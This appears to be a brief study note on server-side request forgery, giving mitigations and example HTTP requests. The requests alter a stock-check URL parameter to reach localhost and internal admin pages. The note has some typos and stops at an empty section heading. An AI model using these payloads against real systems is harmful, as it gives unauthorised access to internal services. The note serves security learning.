<h4>Server-Side Request Forgery (SSRF)</h4>


Server-side request forgery attack allows attacker anto to trick server-side applications into allowing access to the server modifying files. ``SSRF can be successful if the target application reads that from a url without sanitizing it.``
--- ---
**`MITIGATION`**
```
1.Mitigate with firewall
2.Whitelisting and DNS Resolution
3.Authentication on Internal Services
4.Response Handling
5.Validation of user input
```
--- ---

**`Common Attacks`**

Attacks Against the Server Itself
- Attacker induces the application to make an HTTP request back to the server that is hosting the application (via loopback)
- Involves supplying the URL with a hostname like 127.0.0.1 or localhost
- Example code -- shopping application that allows user to check stock
```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118
stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D
6%26storeId%3D1
```
	- Makes request to the URL
	- Retrieves the stock status
	- Return to the user
- Modify this for an attack:
```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-
urlencoded
Content-Length: 118
stockApi=http://localhost/admin
```
	- Server fetches contents of the /admin url and returns to the user
	- Authenticates as the machine/server itself

Attacks Against Other Systems
- Assume there is an administrative interface at https://192.168.0.68/admin
- Attack can exploit and access this:
```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-
urlencoded
Content-Length: 118
stockApi=http://192.168.0.68/admin
```

Circumventing Common SSRF Defenses
